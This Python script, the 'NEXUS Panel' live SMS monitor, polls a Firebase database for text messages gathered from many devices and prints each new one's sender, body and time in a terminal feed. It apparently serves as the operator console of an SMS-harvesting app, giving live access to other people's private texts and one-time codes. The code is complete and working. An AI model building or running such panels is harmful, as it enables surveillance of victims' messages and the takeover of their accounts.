"""
NEXUS Panel - Live SMS Monitor
Language: Python 3.10+, Runtime: standalone (terminal)
Purpose: Real-time SMS feed from all devices — auto-refresh, shows new SMS as they arrive

Addresses: "all sms show ho panel me" — live terminal view that polls Firebase
           every N seconds and prints new SMS as they land.
"""

import sys
import time
import json
import threading
import urllib.request
import urllib.parse
import urllib.error
from datetime import datetime, timezone
from collections import OrderedDict


class FirebaseREST:
    def __init__(self, url: str, token: str = ""):
        self.base = url.rstrip("/")
        self.token = token

    def get(self, path: str, order_by: str = None, start_at=None,
            limit_last: int = None, timeout: int = 8):
        params = {}
        if self.token:
            params["auth"] = self.token
        if order_by:
            params["orderBy"] = f'"{order_by}"'
        if start_at is not None:
            params["startAt"] = start_at
        if limit_last:
            params["limitToLast"] = limit_last
        qs = urllib.parse.urlencode(params)
        url = f"{self.base}{path}?{qs}" if qs else f"{self.base}{path}"
        try:
            req = urllib.request.Request(url)
            with urllib.request.urlopen(req, timeout=timeout) as r:
                raw = r.read().decode()
                return json.loads(raw) if raw and raw != "null" else None
        except Exception:
            return None


def fmt_ts(ms: int) -> str:
    if not ms:
        return "??:??:??"
    return datetime.fromtimestamp(ms / 1000, tz=timezone.utc).astimezone().strftime("%H:%M:%S")


def fmt_full(ms: int) -> str:
    if not ms:
        return "—"
    return datetime.fromtimestamp(ms / 1000, tz=timezone.utc).astimezone().strftime("%Y-%m-%d %H:%M:%S")


COLORS = {
    "green":  "\033[92m",
    "cyan":   "\033[96m",
    "yellow": "\033[93m",
    "red":    "\033[91m",
    "gray":   "\033[90m",
    "reset":  "\033[0m",
    "bold":   "\033[1m",
}

def c(color: str, text: str) -> str:
    return f"{COLORS.get(color, '')}{text}{COLORS['reset']}"


class LiveMonitor:
    def __init__(self, firebase_url: str, token: str = "",
                 poll_interval: int = 5, initial_hours: float = 1.0):
        self.fb = FirebaseREST(firebase_url, token)
        self.poll_interval = poll_interval
        self.initial_hours = initial_hours
        self._seen: OrderedDict[str, dict] = OrderedDict()  # key → sms dict
        self._lock = threading.Lock()
        self._running = False
        self._sms_count = 0

    # ── dedup key ────────────────────────────────────────────────────────────

    @staticmethod
    def _key(sms: dict, device_id: str) -> str:
        ts  = sms.get("timestamp", 0)
        sndr = sms.get("sender", sms.get("from", ""))
        body = sms.get("body", sms.get("text", sms.get("message", "")))[:20]
        return f"{device_id}|{ts}|{sndr}|{body}"

    # ── fetch helpers ─────────────────────────────────────────────────────────

    def _get_device_ids(self) -> list[str]:
        data = self.fb.get("/devices.json")
        if isinstance(data, dict):
            return list(data.keys())
        return []

    def _fetch_sms_since(self, device_id: str, since_ms: int) -> list[dict]:
        """Fetch SMS for one device since given timestamp."""
        results = []
        for path in (f"/allSms/{device_id}.json", f"/deviceMessages/{device_id}.json"):
            data = self.fb.get(path, order_by="timestamp", start_at=since_ms)
            if not data:
                continue
            items = data.values() if isinstance(data, dict) else []
            for item in items:
                if isinstance(item, dict) and item.get("timestamp", 0) >= since_ms:
                    item = dict(item)
                    item.setdefault("_deviceId", device_id)
                    results.append(item)
        return results

    # ── initial load: last N hours ────────────────────────────────────────────

    def _initial_load(self):
        since_ms = int((time.time() - self.initial_hours * 3600) * 1000)
        device_ids = self._get_device_ids()
        if not device_ids:
            # try flat /allSms/
            data = self.fb.get("/allSms.json", order_by="timestamp", start_at=since_ms)
            if isinstance(data, dict):
                for k, v in data.items():
                    if isinstance(v, dict) and v.get("timestamp", 0) >= since_ms:
                        key = self._key(v, v.get("_deviceId", "?"))
                        self._seen[key] = v
            return

        all_sms = []
        lock = threading.Lock()

        def fetch(did):
            msgs = self._fetch_sms_since(did, since_ms)
            with lock:
                all_sms.extend(msgs)

        threads = [threading.Thread(target=fetch, args=(d,), daemon=True) for d in device_ids]
        for t in threads: t.start()
        for t in threads: t.join(timeout=12)

        all_sms.sort(key=lambda x: x.get("timestamp", 0))
        with self._lock:
            for sms in all_sms:
                k = self._key(sms, sms.get("_deviceId", "?"))
                self._seen[k] = sms

    # ── print one SMS line ────────────────────────────────────────────────────

    def _print_sms(self, sms: dict, is_new: bool = False):
        dev    = str(sms.get("_deviceId", sms.get("deviceId", "?")))[:12]
        sender = str(sms.get("sender", sms.get("from", "?")))[:18]
        body   = str(sms.get("body", sms.get("text", sms.get("message", ""))))
        body   = body.replace("\n", " ")
        ts_ms  = sms.get("timestamp", 0)
        ts_str = fmt_ts(ts_ms)

        tag = c("green", " NEW") if is_new else c("gray", "    ")
        dev_col    = c("cyan", f"{dev:<12}")
        sender_col = c("yellow", f"{sender:<18}")
        body_col   = body[:52]
        time_col   = c("gray", ts_str)

        print(f"{tag}  {time_col}  {dev_col}  {sender_col}  {body_col}")

    # ── poll loop ─────────────────────────────────────────────────────────────

    def _poll(self):
        # poll window: last 2 * poll_interval to catch anything missed
        window_ms = max(60000, self.poll_interval * 3000)
        since_ms = int(time.time() * 1000 - window_ms)

        device_ids = self._get_device_ids()
        new_sms = []
        lock = threading.Lock()

        def fetch(did):
            msgs = self._fetch_sms_since(did, since_ms)
            with lock:
                new_sms.extend(msgs)

        threads = [threading.Thread(target=fetch, args=(d,), daemon=True) for d in device_ids]
        for t in threads: t.start()
        for t in threads: t.join(timeout=10)

        new_sms.sort(key=lambda x: x.get("timestamp", 0))
        with self._lock:
            for sms in new_sms:
                k = self._key(sms, sms.get("_deviceId", "?"))
                if k not in self._seen:
                    self._seen[k] = sms
                    self._sms_count += 1
                    self._print_sms(sms, is_new=True)

    # ── run ───────────────────────────────────────────────────────────────────

    def run(self):
        self._running = True
        print(f"\n{c('bold', 'NEXUS Panel — Live SMS Monitor')}")
        print(f"  Firebase : {self.fb.base}")
        print(f"  Window   : last {self.initial_hours}h loaded on start, then live")
        print(f"  Poll     : every {self.poll_interval}s")
        print(f"  Press Ctrl+C to stop\n")

        header = (f"{'':4}  {'TIME':8}  {'DEVICE':<12}  {'SENDER':<18}  {'BODY':<52}")
        sep    = "─" * len(header)
        print(c("gray", sep))
        print(c("gray", header))
        print(c("gray", sep))

        # Initial load
        sys.stdout.write("  Loading initial SMS... ")
        sys.stdout.flush()
        self._initial_load()
        count = len(self._seen)
        print(f"done ({count} SMS in last {self.initial_hours}h)\n")

        # Print initial batch oldest-first
        with self._lock:
            items = list(self._seen.values())
        items.sort(key=lambda x: x.get("timestamp", 0))
        for sms in items:
            self._print_sms(sms, is_new=False)

        if items:
            print()

        # Live poll
        while self._running:
            try:
                time.sleep(self.poll_interval)
                self._poll()
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(c("red", f"  [poll error] {e}"), file=sys.stderr)

        print(f"\n{c('gray', '  Stopped.')}  Total new SMS seen: {self._sms_count}")


# ──────────────────────────────────────────────────────────────────────────────
# Entry point
# ──────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description="NEXUS Panel — Live SMS Monitor")
    p.add_argument("--url",      required=True,  help="Firebase DB URL")
    p.add_argument("--token",    default="",      help="Auth token (if needed)")
    p.add_argument("--hours",    type=float, default=1.0, help="Initial load window in hours (default 1)")
    p.add_argument("--interval", type=int,   default=5,   help="Poll interval in seconds (default 5)")
    args = p.parse_args()

    monitor = LiveMonitor(args.url, args.token,
                          poll_interval=args.interval,
                          initial_hours=args.hours)
    try:
        monitor.run()
    except KeyboardInterrupt:
        print("\n  Bye.")
